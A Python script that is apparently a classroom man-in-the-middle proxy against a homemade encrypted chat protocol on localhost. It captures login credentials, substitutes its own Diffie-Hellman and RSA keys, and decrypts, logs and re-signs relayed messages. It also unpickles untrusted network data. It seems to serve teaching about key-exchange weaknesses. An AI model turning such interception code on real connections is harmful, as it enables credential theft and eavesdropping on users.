import socket
import threading
import pickle
import struct
from cryptography.hazmat.primitives import serialization
from diffie_hellman import perform_key_exchange
from rsa_utils import generate_rsa_keys, rsa_sign, rsa_verify
from aes import encrypt_message, decrypt_message
from prng_utils import generate_secure_key, generate_secure_iv

REAL_SERVER_HOST = "127.0.0.1"
REAL_SERVER_PORT = 12346
MITM_HOST = "127.0.0.1"
MITM_PORT = 12345

def recv_pickle(sock):
    try:
        raw_len = sock.recv(4)
        if not raw_len:
            raise ConnectionError("Erro ao ler comprimento do pacote")
        msg_len = struct.unpack("!I", raw_len)[0]
        data = b""
        while len(data) < msg_len:
            packet = sock.recv(msg_len - len(data))
            if not packet:
                raise ConnectionError("Conexão encerrada")
            data += packet
        return pickle.loads(data)
    except Exception as e:
        print(f"[MITM] Erro ao receber pickle: {e}")
        raise

def send_pickle(sock, obj):
    try:
        data = pickle.dumps(obj)
        length = struct.pack("!I", len(data))
        sock.sendall(length + data)
    except Exception as e:
        print(f"[MITM] Erro ao enviar pickle: {e}")
        raise

session_keys = {}

def handle_connection(client_sock, addr):
    print(f"[MITM] Nova conexão do cliente {addr}")
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((REAL_SERVER_HOST, REAL_SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Falha ao conectar ao servidor: {e}")
        client_sock.close()
        return

    try:
        auth_data = recv_pickle(client_sock)
        print(f"[MITM] Credenciais recebidas do cliente {addr}: {auth_data}")
        send_pickle(server_sock, auth_data)
        response = recv_pickle(server_sock)
        print(f"[MITM] Resposta do servidor: {response.get('status')}")
        dh_params = serialization.load_pem_parameters(response["dh_parameters"])
        mitm_private_dh_server = dh_params.generate_private_key()
        mitm_public_dh_server = mitm_private_dh_server.public_key()
        mitm_private_rsa_server, mitm_public_rsa_server = generate_rsa_keys()
        session_keys[addr] = {
            "dh_params": dh_params,
            "mitm_private_dh_server": mitm_private_dh_server,
            "mitm_private_rsa_server": mitm_private_rsa_server,
        }
        response["dh_parameters"] = dh_params.parameter_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.ParameterFormat.PKCS3
        )
        response["server_public_key_dh"] = mitm_public_dh_server.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        response["server_public_key_rsa"] = mitm_public_rsa_server.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        send_pickle(client_sock, response)
        client_key_data = recv_pickle(client_sock)
        print(f"[MITM] Chaves recebidas do cliente: {client_key_data.keys()}")
        mitm_private_dh_client = dh_params.generate_private_key()
        mitm_public_dh_client = mitm_private_dh_client.public_key()
        mitm_private_rsa_client, mitm_public_rsa_client = generate_rsa_keys()
        session_keys[addr]["mitm_private_dh_client"] = mitm_private_dh_client
        session_keys[addr]["mitm_private_rsa_client"] = mitm_private_rsa_client
        client_pub_dh = serialization.load_pem_public_key(client_key_data["client_public_key_dh"])
        server_pub_dh = serialization.load_pem_public_key(response["server_public_key_dh"])
        shared_key_client = perform_key_exchange(mitm_private_dh_client, client_pub_dh)
        shared_key_server = perform_key_exchange(mitm_private_dh_server, server_pub_dh)
        session_keys[addr]["shared_key_client"] = shared_key_client
        session_keys[addr]["shared_key_server"] = shared_key_server
        client_key_data["client_public_key_dh"] = mitm_public_dh_client.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        client_key_data["client_public_key_rsa"] = mitm_public_rsa_client.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        send_pickle(server_sock, client_key_data)
        print(f"[MITM] Sessão estabelecida com cliente {addr}")
        print("[MITM] MITM agora pode ler/modificar mensagens")
        threading.Thread(target=relay, args=(client_sock, server_sock, addr, "client"), daemon=True).start()
        threading.Thread(target=relay, args=(server_sock, client_sock, addr, "server"), daemon=True).start()
    except Exception as e:
        print(f"[MITM] Erro na conexão {addr}: {e}")
        client_sock.close()
        server_sock.close()

def relay(src_sock, dst_sock, addr, origin):
    try:
        while True:
            data = recv_pickle(src_sock)
            print(f"[MITM] Pacote recebido de {origin}: {data}")
            if origin == "client":
                key_in = session_keys[addr]["shared_key_client"]
                key_out = session_keys[addr]["shared_key_server"]
                rsa_out = session_keys[addr]["mitm_private_rsa_server"]
            else:
                key_in = session_keys[addr]["shared_key_server"]
                key_out = session_keys[addr]["shared_key_client"]
                rsa_out = session_keys[addr]["mitm_private_rsa_client"]
            try:
                plaintext = decrypt_message(key_in, data["nonce"], data["ciphertext"], data["hmac"])
                plaintext_str = plaintext.decode(errors='ignore')
                print(f"[MITM] Mensagem interceptada ({origin}): {plaintext_str}")
                # Verificar a assinatura RSA
                sender_public_key = serialization.load_pem_public_key(data["sender_public_key"])
                if not rsa_verify(sender_public_key, data["signature"], plaintext):
                    print(f"[MITM] Assinatura inválida recebida de {origin}")
                # Opcional: Modificar a mensagem
                # plaintext = b"MITM modificou: " + plaintext
                signature = rsa_sign(rsa_out, plaintext)
                nonce, ciphertext, hmac_val = encrypt_message(key_out, plaintext)
                send_data = {
                    "nonce": nonce,
                    "ciphertext": ciphertext,
                    "hmac": hmac_val,
                    "signature": signature,
                    "sender_public_key": rsa_out.public_key().public_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PublicFormat.SubjectPublicKeyInfo
                    )
                }
                print(f"[MITM] Enviando mensagem para { 'servidor' if origin == 'client' else 'cliente' }: {plaintext_str}")
                send_pickle(dst_sock, send_data)
            except Exception as e:
                print(f"[MITM] Erro ao processar mensagem de {origin}: {e}")
                break
    except Exception as e:
        print(f"[MITM] Relay encerrado para {origin}: {e}")
    finally:
        print(f"[MITM] Fechando conexão para {addr} ({origin})")
        src_sock.close()
        dst_sock.close()

def start_proxy():
    print("[MITM] Iniciando proxy MITM...")
    print(f"[MITM] Interceptando em {MITM_HOST}:{MITM_PORT}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((MITM_HOST, MITM_PORT))
    server.listen(5)
    try:
        while True:
            client_sock, addr = server.accept()
            threading.Thread(target=handle_connection, args=(client_sock, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("[MITM] Proxy finalizado manualmente")
    finally:
        server.close()

if __name__ == "__main__":
    start_proxy()